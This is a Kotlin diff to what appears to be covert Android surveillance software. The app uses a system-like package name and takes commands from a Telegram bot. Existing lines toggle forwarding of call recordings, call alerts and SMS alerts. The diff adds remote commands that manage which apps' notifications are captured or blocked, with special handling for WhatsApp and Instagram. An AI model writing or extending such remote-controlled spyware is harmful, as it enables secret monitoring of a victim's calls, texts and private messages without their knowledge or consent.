@@ -169,8 +169,98 @@ object BotActions {
             "toggle_call_rec" -> prefs.forwardRecordingEnabled = !prefs.forwardRecordingEnabled
             "toggle_call_events" -> prefs.callAlertsEnabled = !prefs.callAlertsEnabled
             "toggle_sms_events" -> prefs.smsAlertsEnabled = !prefs.smsAlertsEnabled
+            "toggle_notif_events" -> {
+                prefs.notificationEventsEnabled = !prefs.notificationEventsEnabled
+                val intent = android.content.Intent("com.system.superiormonitor.ACTION_UPDATE_NOTIFICATIONS")
+                context.sendBroadcast(intent)
+            }
+            "toggle_block_social" -> prefs.notificationBlockSocialEnabled = !prefs.notificationBlockSocialEnabled
         }
     }
+
+    fun handleNotificationBlacklistAdd(context: Context, text: String, chatId: Long) {
+        val prefs = PrefsManager.getInstance(context)
+        val token = prefs.botToken
+        
+        val packageName = text.trim()
+        val pkgRegex = Regex("^[a-z][a-z0-9_]*(\\.[a-z0-9_]+)+[0-9a-z_]\$")
+        
+        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+            if (!pkgRegex.matches(packageName)) {
+                TelegramApi.sendMessage(token, chatId.toString(), "❌ Invalid package name format. Must be like 'com.example.app'.", "Markdown")
+                return@launch
+            }
+            
+            val blacklist = prefs.notificationBlacklist.toMutableSet()
+            if (blacklist.contains(packageName)) {
+                TelegramApi.sendMessage(token, chatId.toString(), "⚠️ `$packageName` is already in the blacklist.", "Markdown")
+                return@launch
+            }
+            
+            blacklist.add(packageName)
+            prefs.notificationBlacklist = blacklist
+            
+            val unblocked = prefs.notificationSocialUnblocked.toMutableSet()
+            if (unblocked.contains(packageName)) {
+                unblocked.remove(packageName)
+                prefs.notificationSocialUnblocked = unblocked
+            }
+            
+            TelegramApi.sendMessage(token, chatId.toString(), "✅ Successfully added `$packageName` to the notification blacklist.", "Markdown")
+        }
+    }
+
+    fun handleNotificationBlacklistRemove(context: Context, text: String, chatId: Long) {
+        val prefs = PrefsManager.getInstance(context)
+        val token = prefs.botToken
+        val packageName = text.trim()
+        
+        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+            val blacklist = prefs.notificationBlacklist.toMutableSet()
+            
+            var wasRemoved = false
+            
+            if (blacklist.contains(packageName)) {
+                blacklist.remove(packageName)
+                prefs.notificationBlacklist = blacklist
+                wasRemoved = true
+            } else if (prefs.notificationBlockSocialEnabled) {
+                // Check if it's an implicitly blocked social app
+                val isSocial = (packageName == "com.whatsapp" && prefs.whatsappUpdatesEnabled) ||
+                               (packageName == "com.whatsapp.w4b" && prefs.whatsappBusinessUpdatesEnabled) ||
+                               (packageName == "com.instagram.android" && prefs.instagramEnabled)
+                
+                if (isSocial) {
+                    val unblocked = prefs.notificationSocialUnblocked.toMutableSet()
+                    if (!unblocked.contains(packageName)) {
+                        unblocked.add(packageName)
+                        
+                        // Check if all active social apps are now unblocked
+                        val allSocials = mutableListOf<String>()
+                        if (prefs.whatsappUpdatesEnabled) allSocials.add("com.whatsapp")
+                        if (prefs.whatsappBusinessUpdatesEnabled) allSocials.add("com.whatsapp.w4b")
+                        if (prefs.instagramEnabled) allSocials.add("com.instagram.android")
+                        
+                        if (unblocked.containsAll(allSocials)) {
+                            prefs.notificationBlockSocialEnabled = false
+                            prefs.notificationSocialUnblocked = emptySet()
+                        } else {
+                            prefs.notificationSocialUnblocked = unblocked
+                        }
+                        wasRemoved = true
+                    }
+                }
+            }
+            
+            if (!wasRemoved) {
+                TelegramApi.sendMessage(token, chatId.toString(), "⚠️ `$packageName` is not in the blacklist.", "Markdown")
+                return@launch
+            }
+            
+            TelegramApi.sendMessage(token, chatId.toString(), "✅ Successfully removed `$packageName` from the notification blacklist.", "Markdown")
+        }
+    }
+
     
     fun toggleSocialUpdateFeature(context: Context, data: String, queryId: String) {
         val prefs = PrefsManager.getInstance(context)
